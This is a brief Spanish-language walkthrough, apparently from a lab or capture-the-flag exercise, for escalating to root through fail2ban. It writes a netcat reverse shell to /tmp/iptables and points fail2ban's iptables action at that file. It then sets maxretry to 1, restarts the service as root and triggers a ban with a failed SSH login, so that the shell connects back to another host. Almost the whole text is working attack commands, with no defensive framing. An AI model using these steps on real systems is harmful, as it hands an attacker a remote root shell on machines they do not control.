Crear reverse shell con nombre iptables
```
echo "nc -e /bin/bash 192.168.1.89 1337" > /tmp/iptables
```

Editar archivo de fail2ban para especificar el nuevo iptables
```
nano /etc/fail2ban/action.d/iptables-common.conf
```

```
# Option:  iptables
# Notes.:  Actual command to be executed, including common to all calls options
# Values:  STRING
iptables = /tmp/iptables 
```

Modificar iptable-common.conf para acelerar el baneo con maxretry a 1.
```
nano /etc/fail2ban/jail.conf
```

```
# "bantime" is the number of seconds that a host is banned.
bantime  = 10m

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 30s

# "maxretry" is the number of failures before a host get banned.
maxretry = 1
```

Reiniciar fail2ban
```
sudo -u root /usr/bin/systemctl restart fail2ban
```

Intentar conectarse por ssh con un tercer host con contraseña incorrecta y provocar el ban
```
ssh root@192.168.1.89
```